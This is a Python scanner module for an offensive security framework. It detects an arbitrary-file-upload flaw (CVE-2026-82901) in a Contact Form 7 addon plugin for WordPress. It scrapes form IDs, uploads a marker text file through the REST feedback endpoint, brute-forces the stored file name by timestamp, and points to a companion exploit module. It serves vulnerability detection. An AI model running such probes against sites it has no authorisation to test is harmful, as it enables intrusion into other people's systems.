#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""UACF7 <= 3.5.50 CF7 signature upload (CVE-2026-82901)."""

import re
import secrets
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "ultimate-addons-for-contact-form-7"
_VULN_HIGH = (3, 5, 50)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "UACF7 CVE-2026-82901 upload detect",
        "description": "Detects CF7 REST feedback upload to uacf7-uploads via signature field.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-82901",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-82901"],
        "modules": ["exploits/multi/http/uacf7_cve_2026_82901_upload"],
        "tags": ["web", "scanner", "wordpress", "contact-form-7", "upload", "cve-2026-82901"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["exploits/multi/http/uacf7_cve_2026_82901_upload"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    upload_probe = OptBool(True, "POST multipart upload probe", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _scrape_cf7(self, html: str):
        fid = re.search(r"contact-forms/(\d+)/feedback", html)
        if not fid:
            fid = re.search(r'name=["\']_wpcf7["\'][^>]*value=["\'](\d+)["\']', html)
        unit = re.search(r'name=["\']_wpcf7_unit_tag["\'][^>]*value=["\']([^"\']+)["\']', html)
        sig = re.search(r'name=["\']([^"\']*(?:uacf7|signature)[^"\']*)["\']', html, re.I)
        if fid:
            return fid.group(1), unit.group(1) if unit else f"wpcf7-f{fid.group(1)}-o1", (
                sig.group(1) if sig else "your-signature"
            )
        return "", "", ""

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        html = ""
        for path in ("/", "/contact/", "/contact-us/"):
            page = self.http_request(method="GET", path=self._join(path), allow_redirects=True)
            if page and "ultimate-addons-for-contact-form-7" in (page.text or ""):
                html = page.text or ""
                break
        form_id, unit_tag, sig_field = self._scrape_cf7(html)
        if not form_id:
            return False
        if not self.upload_probe:
            self.set_info(severity="high", reason="UACF7 + CF7 form present", cve="CVE-2026-82901")
            return True
        marker = secrets.token_hex(4)
        fname = f"ks{secrets.token_hex(3)}"
        bnd = "----WebKitFormBoundaryUACF782901x"
        parts = [
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"_wpcf7\"\r\n\r\n{form_id}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"_wpcf7_unit_tag\"\r\n\r\n{unit_tag}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"your-name\"\r\n\r\nNuclei\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"your-email\"\r\n\r\nnuclei@example.com\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"{sig_field}\"; filename=\"{fname}.txt\"\r\n"
            f"Content-Type: text/plain\r\n\r\nCVE-82901-{marker}\r\n",
            f"--{bnd}--\r\n",
        ]
        ts_before = int(time.time())
        self.http_request(
            method="POST",
            path=self._join(f"/wp-json/contact-form-7/v1/contact-forms/{form_id}/feedback"),
            headers={
                "Content-Type": f"multipart/form-data; boundary={bnd}",
                "X-Requested-With": "XMLHttpRequest",
            },
            data="".join(parts).encode(),
            allow_redirects=False,
        )
        for delta in range(5, -3, -1):
            ts = ts_before + delta
            for name in (f"{ts}-{sig_field}-{fname}.txt", f"{ts}-your-signature-{fname}.txt"):
                hit = self.http_request(
                    method="GET",
                    path=self._join(f"/wp-content/uploads/uacf7-uploads/{name}"),
                    allow_redirects=False,
                )
                if hit and f"CVE-82901-{marker}" in (hit.text or ""):
                    self.set_info(
                        severity="high",
                        reason="UACF7 arbitrary upload under uacf7-uploads",
                        cve="CVE-2026-82901",
                    )
                    return True
        return False
